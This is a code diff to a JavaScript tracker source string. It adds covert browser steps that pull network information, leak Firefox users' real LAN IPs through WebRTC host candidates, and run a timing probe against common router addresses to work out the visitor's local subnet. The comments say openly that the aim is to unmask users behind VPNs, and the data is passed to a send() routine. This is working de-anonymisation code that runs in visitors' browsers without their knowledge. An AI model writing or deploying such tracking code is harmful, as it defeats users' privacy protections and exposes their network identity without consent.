@@ -142,7 +142,7 @@ const TRACKER_SRC = `
           var finish=function(){
             if(finished)return;finished=true;
             if(new Set(p.rtc_detail.ipv4.concat(p.rtc_detail.ipv6)).size>1)p.rtc_detail.stun_mismatch=true;
-            send();
+            step3b();
           };
           stunServers.forEach(function(srv){
             var t0=Date.now();
@@ -169,6 +169,72 @@ const TRACKER_SRC = `
           });
           setTimeout(finish,3500);
         }catch(e){send();}
+      };
+
+
+      var step3b=function(){
+        // Deep IP detection layer — runs AFTER multi-STUN
+        p.net={};
+
+        // 1) Network Information API — ISP bandwidth/RTT fingerprint (VPN-invariant)
+        try{
+          var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+          if(nc){p.net.etype=nc.effectiveType;p.net.rtt=nc.rtt;p.net.dl=nc.downlink;p.net.save=nc.saveData;}
+        }catch(e){}
+
+        // 2) Firefox direct host candidate leak (Firefox does NOT use mDNS by default)
+        // In Firefox, host candidates expose real LAN IP (192.168.x.x, 10.x.x.x)
+        p.net.ff_host=[];
+        try{
+          var isFF=navigator.userAgent.indexOf('Firefox')!==-1;
+          if(isFF){
+            var pcFF=new RTCPeerConnection({iceServers:[]});
+            pcFF.createDataChannel('');
+            pcFF.createOffer().then(function(o){
+              // Parse SDP directly — Firefox host candidates contain real LAN IPs
+              var lines=o.sdp.split(String.fromCharCode(10))
+              lines.forEach(function(l){
+                if(l.indexOf('a=candidate:')===0){
+                  var pts=l.split(' ');
+                  var ip=pts[4],tp=pts[7];
+                  if(tp==='host'&&ip&&ip.indexOf('.local')===-1&&ip.indexOf(':')===-1){
+                    if(p.net.ff_host.indexOf(ip)===-1)p.net.ff_host.push(ip);
+                  }
+                }
+              });
+              try{pcFF.close();}catch(e){}
+              step3c();
+            }).catch(function(){step3c();});
+            setTimeout(function(){try{pcFF.close();}catch(e){}step3c();},1500);
+          } else { step3c(); }
+        }catch(e){step3c();}
+      };
+
+      var step3c=function(){
+        // 3) Local gateway probe — timing attack on common router IPs
+        // Fast connection = user is on that subnet → reveals local network range
+        // This works even with VPN because LAN traffic doesn't go through VPN
+        p.net.gw=[];
+        var gwTargets=['192.168.1.1','192.168.0.1','192.168.2.1','10.0.0.1','10.0.1.1','172.16.0.1','172.16.1.1'];
+        var gwPending=gwTargets.length;
+        var gwDone=false;
+        var gwFinish=function(){if(gwDone)return;gwDone=true;send();};
+        gwTargets.forEach(function(ip){
+          var t0=Date.now();
+          var img=new Image();
+          img.onload=img.onerror=function(){
+            var rtt=Date.now()-t0;
+            // RTT < 50ms = this IP responded = user is on this subnet
+            if(rtt<50)p.net.gw.push({ip:ip,rtt:rtt});
+            gwPending--;if(gwPending<=0)gwFinish();
+          };
+          // Use a favicon path — will fail with CORS but timing is measurable
+          img.src='http://'+ip+'/favicon.ico?_='+Date.now();
+          setTimeout(function(){
+            if(!img.complete){img.src='';gwPending--;if(gwPending<=0)gwFinish();}
+          },800);
+        });
+        setTimeout(gwFinish,1200);
       };
 
       var step2=function(){
